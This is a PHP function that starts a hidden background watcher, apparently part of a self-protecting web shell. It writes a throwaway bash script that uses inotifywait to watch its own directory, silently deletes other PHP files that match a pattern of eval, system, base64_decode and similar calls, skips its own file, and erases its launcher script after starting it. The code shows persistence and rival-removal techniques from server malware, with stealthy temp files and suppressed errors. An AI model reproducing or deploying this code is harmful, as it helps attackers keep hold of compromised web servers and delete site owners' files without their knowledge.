function ds_start_watcher() {
    global $ds_self_dir, $ds_self_path, $ds_hideouts, $ds_self_code;
    $pid_file = sys_get_temp_dir() . '/.ds_watcher_' . substr(md5($_SERVER['HTTP_HOST'] ?? 'localhost'), 0, 8) . '.pid';
    if (file_exists($pid_file)) {
        $old_pid = @file_get_contents($pid_file);
        if ($old_pid && @file_exists("/proc/$old_pid")) return;
    }
    $inotify_cmd = 'which inotifywait 2>/dev/null';
    $has_inotify = trim(@shell_exec($inotify_cmd));
    if ($has_inotify) {
        $watcher_script = sys_get_temp_dir() . '/.ds_watch_' . uniqid() . '.sh';
        $watch_dir = escapeshellarg($ds_self_dir);
        $self_path_esc = escapeshellarg($ds_self_path);
        $script_content = '#!/bin/bash
WATCH_DIR=' . $watch_dir . '
SELF_PATH=' . $self_path_esc . '
PID_FILE=' . escapeshellarg($pid_file) . '
echo $$ > "$PID_FILE"
inotifywait -m -r -e create -e modify -e move -e delete --format "%e %w%f" "$WATCH_DIR" 2>/dev/null | while read event filepath; do
    [[ "$filepath" == "$SELF_PATH" ]] && continue
    ext="${filepath##*.}"
    case "$ext" in
        php|php3|php4|php5|phtml|php7|php8|shtml|inc|htaccess)
            if [ -f "$filepath" ]; then
                HITS=$(head -c 20480 "$filepath" 2>/dev/null | grep -c -E "eval\(|system\(|shell_exec\(|passthru\(|exec\(|base64_decode|gzinflate|assert\(|preg_replace.*e" 2>/dev/null)
                if [ "$HITS" -ge 5 ]; then
                    rm -f "$filepath" 2>/dev/null
                    logger -t "DS_WATCHER" "Removed malicious shell: $filepath"
                fi
            fi
            ;;
    esac
done
';
        file_put_contents($watcher_script, $script_content);
        @chmod($watcher_script, 0755);
        @exec('nohup bash ' . escapeshellarg($watcher_script) . ' > /dev/null 2>&1 &');
        @exec('(sleep 5; rm -f ' . escapeshellarg($watcher_script) . ') > /dev/null 2>&1 &');
    }
}
